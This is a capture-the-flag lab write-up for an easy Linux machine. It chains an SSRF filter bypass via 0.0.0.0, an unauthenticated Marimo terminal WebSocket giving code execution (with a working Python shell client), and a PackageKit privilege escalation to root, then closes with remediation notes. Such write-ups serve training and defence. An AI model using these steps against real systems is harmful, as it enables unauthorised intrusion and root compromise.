---
description: 'Difficulty: Easy | OS: Linux'
---

# Cohort

### 1. Port scanning

Initial full-port scan:

```bash
nmap -p- --min-rate 5000 10.129.60.206
```

Relevant open ports:

```
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
```

Service detection:

```bash
nmap -sV -sC -p22,80,443 --min-rate 5000 10.129.60.206
```

The web server redirected HTTP to `https://cohort.htb/`, and the TLS certificate included:

```
cohort.htb
*.cohort.htb
```

### 2. Hostname configuration

Add the main hostname:

```bash
echo "10.129.60.206 cohort.htb" | sudo tee -a /etc/hosts
```

The target was later found to use a hidden virtual host:

```bash
echo "10.129.60.206 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
```

The MTU was lowered to avoid tunnel fragmentation issues:

```bash
sudo ip link set dev tun0 mtu 1300
```

### 3. Web enumeration

The main site exposed a Client Insights portal with a source URL validation feature. The HTML shell loaded a JavaScript application:

```bash
curl -k -i https://cohort.htb/portal.html
curl -ks https://cohort.htb/assets/app.js -o app.js
```

The application accepted a report source URL and fetched it server-side. This identified a likely SSRF attack surface.

### 4. API discovery

API paths were fuzzed with `ffuf`:

```bash
ffuf -k -u https://cohort.htb/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc all -fc 404 -ac
```

The endpoint `/api/health` returned:

```bash
curl -k -i https://cohort.htb/api/health
```

```json
{"ok": true, "service": "cohort-insights"}
```

### 5. SSRF validation and bypass

The source validation feature rejected normal loopback addresses such as:

```
http://127.0.0.1/
http://localhost/
```

The wildcard address bypassed the filter:

```
http://0.0.0.0/
```

Using the SSRF against `/status` disclosed nginx upstream information, including the internal notebook service:

```
nb-1be3782a8afd3ad5.cohort.htb -> 127.0.0.1:8888
```

This revealed the hidden virtual host.

### 6. Discovering the Marimo service

After adding the discovered vhost to `/etc/hosts`, access it with:

```bash
curl -k -i https://nb-1be3782a8afd3ad5.cohort.htb/
```

The service was Marimo `0.20.4`. The notebook source also confirmed the version:

```python
__generated_with = "0.20.4"
```

Marimo versions up to `0.20.4` are affected by a pre-authentication RCE in `/terminal/ws`; the issue was fixed in `0.23.0`.

Reference: [Marimo GHSA-2679-6mx9-h9xc](https://github.com/marimo-team/marimo/security/advisories/GHSA-2679-6mx9-h9xc)

### 7. Unauthenticated terminal access

The vulnerable endpoint was:

```
wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
```

The WebSocket accepted unauthenticated connections. Commands had to be sent as plain text with a newline. A one-shot test with `wscat`:

```bash
wscat -n -c \
  wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws \
  -x $'id\n'
```

The command executed as:

```
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
```

### 8. User flag

Marimo WebSocket Shell Script:

```python
import ssl
import sys
import threading
import websocket

url = "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws"

ws = websocket.create_connection(
    url,
    sslopt={"cert_reqs": ssl.CERT_NONE}
)

def receive():
    while True:
        try:
            data = ws.recv()
            if isinstance(data, bytes):
                data = data.decode(errors="replace")
            print(data, end="")
        except Exception:
            break

threading.Thread(target=receive, daemon=True).start()

for line in sys.stdin:
    ws.send(line.rstrip("\n") + "\n")
```

Run it to get the terminal access:                                                                                                                    &#x20;

{% code overflow="wrap" %}
```shellscript
┌──(kali㉿kali)-[~]
└─$ python3 wsclient.py
marimo@cohort:~$ 
```
{% endcode %}

The home directory contained a notebook and the user flag:

```bash
ls
cat user.txt
```

The notebook was also useful for confirming the Marimo version:

```bash
cat notebooks/retention.py
```

### 9. Local privilege-escalation enumeration

The shell was running as `marimo`, with no usable passwordless sudo rule:

```bash
id
whoami
sudo -n -l
```

PackageKit was installed and held at the vulnerable version:

```bash
pkcon --version
dpkg-query -W -f='${Package} ${Version}\n' packagekit
dpkg -l packagekit
apt-mark showhold
```

Output included:

```
packagekit 1.2.8-2ubuntu1.2
```

The `hi` state in `dpkg -l` means the package is installed and held. Ubuntu lists `1.2.8-2ubuntu1.5` as the fixed revision for Ubuntu 24.04, making the installed `.2` revision vulnerable in this lab.

Reference: [Ubuntu CVE-2026-41651](https://ubuntu.com/security/CVE-2026-41651)

### 10. PackageKit privilege escalation

The relevant vulnerability was CVE-2026-41651, a PackageKit transaction race that can allow an unprivileged local user to install a package as root. The PoC used for the lab was:

```
https://github.com/Vozec/CVE-2026-41651
```

The executable file in that repository was transferred to the target and run from the `marimo` shell. After successful execution, privilege escalation was verified with:

```bash
id
whoami
cat /root/root.txt
```

### Attack-chain summary

```
HTTPS portal
    -> source URL validator
    -> SSRF using 0.0.0.0
    -> /status disclosure
    -> hidden Marimo vhost
    -> unauthenticated /terminal/ws
    -> shell as marimo
    -> PackageKit 1.2.8-2ubuntu1.2
    -> CVE-2026-41651
    -> root
```

### Remediation notes

* Validate URLs using robust IP parsing after DNS resolution, including alternate address representations.
* Block redirects from public URLs to internal or loopback destinations.
* Require authentication on every WebSocket endpoint, including `/terminal/ws`.
* Upgrade Marimo to `0.23.0` or later.
* Upgrade PackageKit to the fixed Ubuntu revision or later.
* Avoid leaving security-sensitive packages deliberately held at vulnerable versions.
